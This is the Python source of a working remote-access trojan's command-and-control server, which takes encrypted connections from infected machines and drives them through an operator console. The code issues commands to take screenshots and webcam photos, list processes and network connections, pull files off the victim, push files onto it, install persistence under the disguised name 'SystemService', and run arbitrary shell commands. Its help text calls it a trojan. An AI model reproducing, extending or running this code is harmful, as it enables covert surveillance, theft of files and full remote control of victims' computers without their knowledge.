import socket
import json
import base64
import threading
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import os
from datetime import datetime
import time

class ReverseShellServer:
    def __init__(self, host='0.0.0.0'):
        self.sock = None
        self.aes_key = get_random_bytes(32)
        self.sessions = {}
        self.active_clients = {}
        self.HOST = host
        self.command_lock = threading.Lock()
        self.client_dir = None
        self.response_queue = {}

    def get_port(self):
        return int(datetime.now().strftime("%d%m"))
        
    def key_exchange(self, client_sock, client_addr):
        try:
            print(f"[+] Performing key exchange with {client_addr[0]}:{client_addr[1]}")

            key_size_data = client_sock.recv(16)
            if not key_size_data:
                return False
                
            key_size = int(key_size_data.strip())
            public_key_data = b""
            while len(public_key_data) < key_size:
                chunk = client_sock.recv(key_size - len(public_key_data))
                if not chunk:
                    return False
                public_key_data += chunk
                    
            public_key = RSA.import_key(public_key_data)
            
            cipher = PKCS1_OAEP.new(public_key)
            encrypted_key = base64.b64encode(cipher.encrypt(self.aes_key))
            client_sock.send(str(len(encrypted_key)).encode().ljust(16) + encrypted_key)
            
            response = self.recv_encrypted(client_sock)
            if response and response.get("type") == "session":
                session_id = response.get("session_id", "unknown")
                self.sessions[client_addr] = {
                    "session_id": session_id,
                    "connected_at": datetime.now(),
                    "last_activity": time.time()
                }
                self.active_clients[client_addr] = client_sock
                print(f"[+] Session established with {client_addr[0]}:{client_addr[1]} (ID: {session_id})")
                print('\nType "help" to see the available commands.\n')
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Key exchange failed: {e}")
            return False
    
    def aes_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, dict):
            data = json.dumps(data).encode('utf-8')
            
        cipher = AES.new(self.aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)
    
    def aes_decrypt(self, encrypted_data):
        try:
            encrypted_data = base64.b64decode(encrypted_data)
            nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]
            
            cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            try:
                return json.loads(decrypted.decode('utf-8'))
            except:
                return decrypted.decode('utf-8')
        except Exception as e:
            return f"Decryption error: {str(e)}"
    
    def send_encrypted(self, client_sock, data):
        with self.command_lock:
            try:
                encrypted = self.aes_encrypt(data)
                client_sock.send(str(len(encrypted)).encode().ljust(16) + encrypted)
                
                for addr, session in self.sessions.items():
                    if self.active_clients.get(addr) == client_sock:
                        session["last_activity"] = time.time()
                        break
                        
                return True
            except Exception as e:
                print(f"[-] Send failed: {e}")
                return False
    
    def recv_encrypted(self, client_sock, timeout=5):
        with self.command_lock:
            try:
                client_sock.settimeout(timeout)
                size_data = client_sock.recv(16)
                if not size_data:
                    return None
                    
                size = int(size_data.strip())
                encrypted_data = b""
                while len(encrypted_data) < size:
                    chunk = client_sock.recv(size - len(encrypted_data))
                    if not chunk:
                        return None
                    encrypted_data += chunk
                    
                for addr, session in self.sessions.items():
                    if self.active_clients.get(addr) == client_sock:
                        session["last_activity"] = time.time()
                        break
                        
                return self.aes_decrypt(encrypted_data)
            except socket.timeout:
                return {"type": "timeout"}
            except Exception as e:
                print(f"[-] Receive failed: {e}")
                return None

    def send_heartbeat(self, client_sock):
        try:
            return self.send_encrypted(client_sock, {"type": "heartbeat"})
        except:
            return False

    def cleanup_client(self, client_sock, client_addr):
        try:
            if client_sock:
                client_sock.close()
        except:
            pass
            
        if client_addr in self.sessions:
            del self.sessions[client_addr]
        if client_addr in self.active_clients:
            del self.active_clients[client_addr]
            
        print(f"[-] Connection with {client_addr[0]}:{client_addr[1]} closed")

    def save_file(self, file_data, file_name):
        try:
            if not os.path.exists(self.client_dir):
                os.makedirs(self.client_dir)
            
            file_path = os.path.join(self.client_dir, file_name)
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(file_data))
            
            return f"File saved to {file_path}"
        except Exception as e:
            return f"Error saving file: {str(e)}"

    def save_image(self, image_data, image_type, client_addr):
        try:
            if not os.path.exists(self.client_dir):
                os.makedirs(self.client_dir)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{self.client_dir}/{client_addr[0]}_{image_type}_{timestamp}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(image_data))
            
            return f"{image_type.capitalize()} saved to {filename}"
        except Exception as e:
            return f"Error saving {image_type}: {str(e)}"

    def read_file_for_upload(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            
            if not os.path.isfile(file_path):
                return {"error": f"Path is not a file: {file_path}"}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:  # 50MB limit
                return {"error": f"File too large (max 50MB): {file_size} bytes"}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            return {
                "file_data": base64.b64encode(file_data).decode('utf-8'),
                "file_name": os.path.basename(file_path),
                "file_size": file_size
            }
        except Exception as e:
            return {"error": f"File read failed: {str(e)}"}

    def display_system_info(self, system_info):
        print("\n" + "="*50)
        print("SYSTEM INFORMATION")
        print("="*50)
        
        for key, value in system_info.items():
            if key == "disk_usage" and isinstance(value, dict):
                print("\nDISK USAGE:")
                for device, usage in value.items():
                    print(f"  {device}: {usage['used']}GB / {usage['total']}GB used")
            elif key == "psutil_error" or key == "error":
                print(f"  {key}: {value}")
            elif key == "is_admin":
                print(f"  {key.upper()}: {value}")
            elif not isinstance(value, (dict, list)):
                print(f"  {key.upper()}: {value}")

    def display_process_list(self, processes):
        print("\n" + "="*50)
        print("RUNNING PROCESSES (Top 50)")
        print("="*50)
        print(f"{'PID':<8} {'Name':<25} {'User':<20} {'Memory(MB)':<12} {'CPU%':<6}")
        print("-" * 75)
        
        for proc in processes:
            print(f"{proc['pid']:<8} {proc['name'][:24]:<25} {str(proc['user'])[:19]:<20} {proc['memory_mb']:<12} {proc['cpu']:<6}")

    def display_network_info(self, network_info):
        print("\n" + "="*50)
        print("NETWORK INFORMATION")
        print("="*50)
        
        print("\nNETWORK INTERFACES:")
        for interface, addrs in network_info.get('interfaces', {}).items():
            print(f"  {interface}:")
            for addr in addrs:
                if addr['family'] == 'AddressFamily.AF_INET':
                    print(f"    IP: {addr['address']}, Netmask: {addr['netmask']}")
        
        print("\nACTIVE CONNECTIONS:")
        connections = network_info.get('connections', [])
        if connections:
            for conn in connections[:10]:
                print(f"  {conn['local_address']} (PID: {conn['pid']})")
        else:
            print("  No established connections found")

    def display_camera_list(self, cameras):
        print("\n" + "="*50)
        print("AVAILABLE CAMERAS")
        print("="*50)
        print(f"{'Index':<8} {'Resolution':<20} {'FPS':<10} {'Status':<15}")
        print("-" * 55)
        
        for cam in cameras:
            print(f"{cam['index']:<8} {cam['resolution']:<20} {cam['fps']:<10} {cam['status']:<15}")

    def display_startup_status(self, startup_status):
        print("\n" + "="*50)
        print("STARTUP STATUS")
        print("="*50)
        
        for key, value in startup_status.items():
            status = "ENABLED" if value else "DISABLED"
            print(f"  {key}: {status}")

    def handle_upload_command(self, client_sock, command):
        try:
            parts = command.split(' ', 2)
            if len(parts) < 2:
                print("[-] Usage: upload <local_file> [remote_path]")
                return True
            
            local_file = parts[1].strip('"\'')
            remote_path = parts[2].strip('"\'') if len(parts) > 2 else None
            
            file_info = self.read_file_for_upload(local_file)
            if "error" in file_info:
                print(f"[-] {file_info['error']}")
                return True
            
            print(f"[+] Uploading {file_info['file_name']} ({file_info['file_size']} bytes)...")
            
            upload_command = {
                "type": "upload",
                "file_name": file_info['file_name'],
                "upload_data": file_info['file_data'],
                "target_path": remote_path
            }
            
            return self.send_encrypted(client_sock, upload_command)
            
        except Exception as e:
            print(f"[-] Upload command error: {e}")
            return False

    def show_help(self):
        print("\n" + "="*50)
        print("AVAILABLE COMMANDS")
        print("="*50)
        print("info              - System information")
        print("screenshot        - Take screenshot")
        print("list_cam          - List available cameras")
        print("cam [index]       - Take photo from camera (default: 0)")
        print("processes         - List running processes")
        print("network           - Network information")
        print("download <path>   - Download file from target")
        print("upload <local_file> [remote_path] - Upload file to target")
        print("startup           - Add to startup")
        print("startup_remove    - Remove from startup")
        print("startup_status    - Check startup status")
        print("kill_switch       - Self-destruct trojan")
        print("<command>         - Execute shell command")
        print("exit/quit         - Exit shell")
        print("help              - Show this help")

    def handle_client_command(self, client_sock, client_addr, command):
        if command.lower() in ['exit', 'quit']:
            self.send_encrypted(client_sock, "exit")
            return False
            
        elif command.lower() == 'help':
            self.show_help()
            return True
            
        elif command.lower() == 'info':
            self.send_encrypted(client_sock, {"type": "info"})
            
        elif command.lower() == 'screenshot':
            self.send_encrypted(client_sock, {"type": "screenshot"})
            
        elif command.lower() == 'list_cam':
            self.send_encrypted(client_sock, {"type": "list_cam"})
            
        elif command.lower().startswith('cam'):
            # Проверяем, указан ли индекс камеры
            parts = command.split()
            if len(parts) > 1:
                try:
                    camera_index = int(parts[1])
                except ValueError:
                    print("[-] Invalid camera index. Using default (0)")
                    camera_index = 0
            else:
                camera_index = 0
            
            self.send_encrypted(client_sock, {"type": "cam", "camera_index": camera_index})
            
        elif command.lower() == 'processes':
            self.send_encrypted(client_sock, {"type": "processes"})
            
        elif command.lower() == 'network':
            self.send_encrypted(client_sock, {"type": "network"})
            
        elif command.lower().startswith('download '):
            file_path = command[9:].strip()
            self.send_encrypted(client_sock, {"type": "download", "command": file_path})
            
        elif command.lower().startswith('upload '):
            return self.handle_upload_command(client_sock, command)
        
        elif command.lower() == 'startup':
            self.send_encrypted(client_sock, {"type": "add_to_startup", "startup_name": "SystemService"})
        
        elif command.lower() == 'startup_remove':
            self.send_encrypted(client_sock, {"type": "remove_from_startup", "startup_name": "SystemService"})
        
        elif command.lower() == 'startup_status':
            self.send_encrypted(client_sock, {"type": "check_startup", "startup_name": "SystemService"})
        
        elif command.lower() == 'kill_switch':
            self.send_encrypted(client_sock, {"type": "kill_switch"})
        else:
            self.send_encrypted(client_sock, command)
            
        return True

    def handle_client_response(self, client_sock, client_addr, response):
        if not response:
            print("[-] No response from client")
            return False
            
        if isinstance(response, dict):
            if response.get("type") == "heartbeat":
                return True
            elif response.get("type") == "timeout":
                return True
            elif "output" in response:
                print(f"\n{response['output']}")
            elif "system_info" in response:
                self.display_system_info(response["system_info"])
            elif "screenshot_result" in response:
                result = response["screenshot_result"]
                if "screenshot" in result:
                    message = self.save_image(result["screenshot"], "screenshot", client_addr)
                    print(f"[+] {message}")
                elif "error" in result:
                    print(f"[-] Screenshot error: {result['error']}")
            elif "camera_result" in response:
                result = response["camera_result"]
                if "camera_photo" in result:
                    camera_index = result.get("camera_index", "unknown")
                    resolution = result.get("resolution", "unknown")
                    message = self.save_image(result["camera_photo"], f"cam{camera_index}", client_addr)
                    print(f"[+] Camera {camera_index} ({resolution}): {message}")
                elif "error" in result:
                    print(f"[-] Camera error: {result['error']}")
            elif "camera_list" in response:
                result = response["camera_list"]
                if "cameras" in result:
                    self.display_camera_list(result["cameras"])
                elif "error" in result:
                    print(f"[-] Camera list error: {result['error']}")
            elif "process_list" in response:
                result = response["process_list"]
                if "processes" in result:
                    self.display_process_list(result["processes"])
                elif "error" in result:
                    print(f"[-] Process list error: {result['error']}")
            elif "network_info" in response:
                result = response["network_info"]
                if "error" in result:
                    print(f"[-] Network info error: {result['error']}")
                else:
                    self.display_network_info(result)
            elif "download_result" in response:
                result = response["download_result"]
                if "file_data" in result:
                    message = self.save_file(result["file_data"], result["file_name"])
                    print(f"[+] {message}")
                elif "error" in result:
                    print(f"[-] Download error: {result['error']}")
            elif "upload_result" in response:
                result = response["upload_result"]
                if "success" in result:
                    print(f"[+] {result['message']}")
                elif "error" in result:
                    print(f"[-] Upload error: {result['error']}")
            elif "startup_result" in response:
                result = response["startup_result"]
                if "success" in result:
                    print(f"[+] {result['message']}")
                    if "user_startup" in result:
                        print(f"    User startup: {'✓' if result['user_startup'] else '✗'}")
                    if "system_startup" in result:
                        print(f"    System startup: {'✓' if result['system_startup'] else '✗'}")
                elif "error" in result:
                    print(f"[-] Startup error: {result['error']}")
                else:
                    print(f"[*] {result.get('message', 'Operation completed')}")
            elif "startup_status" in response:
                self.display_startup_status(response["startup_status"])
            elif "killed" in response:
                print(f"[+] {response['killed']}\n")
                return False
            elif "error" in response:
                print(f"[-] Error: {response['error']}")
        else:
            print(f"\n{response}")
            
        return True

    def get_response_with_heartbeat_handling(self, client_sock, client_addr, initial_timeout=30):
        start_time = time.time()
        
        while time.time() - start_time < 120:
            try:
                response = self.recv_encrypted(client_sock, timeout=5)
                
                if response is None:
                    print("[-] Connection lost")
                    return None
                
                if isinstance(response, dict) and response.get("type") == "heartbeat":
                    continue
                
                if isinstance(response, dict) and response.get("type") == "timeout":
                    self.send_heartbeat(client_sock)
                    continue
                
                return response
                
            except Exception as e:
                print(f"[-] Error receiving response: {e}")
                return None
        
        print("[-] Response timeout - no response received")
        return None

    def handle_client(self, client_sock, client_addr):
        print(f"[+] New connection from {client_addr[0]}:{client_addr[1]}")
        
        if not self.key_exchange(client_sock, client_addr):
            self.cleanup_client(client_sock, client_addr)
            return
        
        self.client_dir = f"{client_addr[0]}_files"
        
        try:
            while True:
                try:
                    command = input(f"shadow_control@{client_addr[0]}# ").strip()
                    
                    if not command:
                        continue
                    
                    if command.lower() == 'help':
                        self.show_help()
                        continue
                    
                    if not self.handle_client_command(client_sock, client_addr, command):
                        break
                    
                    print("[*] Waiting for response...")
                    response = self.get_response_with_heartbeat_handling(client_sock, client_addr)
                    
                    if not self.handle_client_response(client_sock, client_addr, response):
                        break
                        
                except KeyboardInterrupt:
                    print("\n[+] Interrupted by user")
                    self.send_encrypted(client_sock, "exit")
                    break
                except Exception as e:
                    print(f"[-] Error handling client: {e}")
                    import traceback
                    traceback.print_exc()
                    break
                    
        except Exception as e:
            print(f"[-] Client handler error: {e}")
        finally:
            self.cleanup_client(client_sock, client_addr)

    def start_server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.HOST, self.get_port()))
            self.sock.listen(5)
            print(f"[+] Server listening on {self.HOST}:{self.get_port()}")
            print("[+] Waiting for connections...")
            
            while True:
                try:
                    client_sock, client_addr = self.sock.accept()
                    
                    client_thread = threading.Thread(
                        target=self.handle_client, 
                        args=(client_sock, client_addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    print("\n[+] Server shutdown requested")
                    break
                except Exception as e:
                    print(f"[-] Accept error: {e}")
                    continue
                    
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            if self.sock:
                self.sock.close()
            print("[+] Server stopped")

if __name__ == "__main__":
    server = ReverseShellServer()
    server.start_server()